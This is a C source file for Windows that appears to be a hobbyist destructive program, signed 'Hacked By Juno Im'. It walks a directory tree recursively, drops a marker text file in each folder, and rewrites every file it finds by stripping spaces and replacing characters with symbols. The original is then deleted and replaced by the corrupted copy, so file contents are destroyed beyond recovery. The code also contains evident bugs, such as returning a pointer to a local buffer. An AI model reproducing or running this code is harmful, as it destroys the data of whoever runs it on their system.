#include "junirus.h"

int junirus_start(const wchar_t *hack) {
	printf("GOGOGO !!!!\n");
	printf("Hacked By Juno Im\n");
	
	junirus(hack);

	return 0;
}

void junirus(const wchar_t *hack) {
	ListDirectoryContents(hack);
	printf("job finished !!\n");
}

bool ListDirectoryContents(const wchar_t *sDir)
{
	WIN32_FIND_DATA fdFile;
	HANDLE hFind = NULL;

	wchar_t sPath[2048];

	//Specify a file mask. *.* = We want everything! 
	wsprintf(sPath, L"%s\\*.*", sDir);

	if ((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
	{
		//wprintf(L"Path not found: [%s]\n", sDir);
		return false;
	}

	do
	{
		//Find first file will always return "."
		//    and ".." as the first two directories. 
		if (wcscmp(fdFile.cFileName, L".") != 0
			&& wcscmp(fdFile.cFileName, L"..") != 0)
		{
			//Build up our file path using the passed in 
			//  [sDir] and the file/foldername we just found: 
			wsprintf(sPath, L"%s\\%s", sDir, fdFile.cFileName);

			//Is the entity a File or Folder? 
			if (fdFile.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				//wprintf(L"Directory: %s\n", sPath);
				ListDirectoryContents(sPath); //Recursion, I love it! 
				makeContents(sPath);
			}
			else{
				//wprintf(L"%s\n", sPath);
				changeContents(sPath);
			}
		}
	} while (FindNextFile(hFind, &fdFile)); //Find the next file. 

	FindClose(hFind); //Always, Always, clean things up! 

	return true;
}

void makeContents(wchar_t *sDir) {
	FILE *file;
	
	wchar_t thisIsJuno[100] = L"\\hello_I_am_Juno_Im.txt";
	
	wcscat(sDir, thisIsJuno);

	file = _wfopen(sDir, L"w+"); //+를이용해서 강제로 생성하기
	fclose(file);
}

void changeContents(wchar_t *sPath) {
	FILE *file;
	FILE *output;
	FILE *f;

	int nChange = 0;
	wchar_t tmpFilePath[2048], t[] = L"v", tmpCmd[3000], del[] = L"DEL ", rename[] = L"RENAME ", space[] = L" ", *ptr;
	char changeBuffer[10][10] = {'b', '\"', '$', '!', '@', '_', '+','`','~','.'};
	char lineBuffer[2024];

	wcscpy(tmpFilePath, sPath);
	wcscat(tmpFilePath, t);
	
	if (!wcsstr(sPath, L"hello_I_am_Juno_IM")) {
		file = _wfopen(sPath, L"rt");
		output = _wfopen(tmpFilePath, L"w+");
		while (!feof(file)) {
			fgets(lineBuffer, sizeof(lineBuffer), file);

			strcpy(lineBuffer, junoStrReplace(lineBuffer, " ", ""));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, "def", "Class"));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, "p", "c"));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, "a", changeBuffer[nChange]));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, "var", "function"));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, ";", changeBuffer[nChange]));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, ":", changeBuffer[nChange]));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, "(", changeBuffer[nChange]));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, "l", changeBuffer[nChange]));
			strcpy(lineBuffer, junoStrReplace(lineBuffer, "]", changeBuffer[nChange]));

			if (nChange != 9)
				nChange++;
			else
				nChange = 0;

			fputs(lineBuffer,output);
		}
		fclose(file);
		fclose(output);

		DeleteFile(sPath);
		MoveFile(tmpFilePath, sPath);
	}
}

char *junoStrReplace(char *subject, char *search, char*replace) {
	//strstr 로 자르고 합체하고 합체
	char tmp1[2024], tmp2[2024], *ptr;
	int sizeBefore;

	strcpy(tmp2, subject);

	while (strstr(tmp2, search)) {
		strcpy(tmp1, tmp2);

		ptr = strstr(tmp1, search);
		sizeBefore = ptr - tmp1;

		memset(tmp2, 0, sizeof(tmp2));
		strncpy(tmp2, tmp1, sizeBefore);

		ptr = ptr + strlen(search);
		strcat(tmp2, replace);

		strcat(tmp2, ptr);
	}

	return tmp2;
}